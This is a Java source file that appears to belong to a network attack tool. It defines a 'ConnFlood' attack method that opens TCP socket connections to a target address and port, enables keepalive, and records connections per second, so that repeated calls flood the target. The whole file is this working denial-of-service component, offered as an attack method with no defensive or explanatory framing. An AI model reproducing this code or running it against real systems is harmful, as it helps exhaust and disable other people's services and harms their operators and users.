package ir.xenoncommunity.jss.methods.impl;

import ir.xenoncommunity.jss.methods.IAttackMethod;
import ir.xenoncommunity.jss.utils.AttackStatics;
import ir.xenoncommunity.jss.utils.SocketUtils;
import lombok.Cleanup;
import lombok.RequiredArgsConstructor;

import java.net.InetAddress;
import java.net.Socket;
import java.net.StandardSocketOptions;

@RequiredArgsConstructor
public class ConnFlood implements IAttackMethod {
    private final AttackStatics statics;

    /**
     * Sends data to the specified address and port.
     *
     * @param addr the destination InetAddress
     * @param port the destination port number
     * @throws Exception if an error occurs during the sending process
     */
    @Override
    public void send(InetAddress addr, int port) throws Exception {
        // create a socket connection to the specified address and port
        @Cleanup Socket socket = new Socket(addr, port);

        // if the socket is not connected, return
        if (!socket.isConnected()) return;

        // enable socket options
        SocketUtils.enableSocketOpts(socket,
                StandardSocketOptions.TCP_NODELAY,
                StandardSocketOptions.SO_KEEPALIVE);
        // set socket timeout
        SocketUtils.setSoTimeout(socket, 1000);

        statics.cps(); // update connection per second statistics
    }
}
